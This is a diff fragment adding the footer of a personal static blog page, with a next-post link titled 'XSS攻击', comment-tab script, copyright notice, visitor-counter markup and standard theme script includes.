+                <a href="/post/4fa736d8.html" rel="next" title="XSS攻击">
+                  XSS攻击 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">qnjy</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
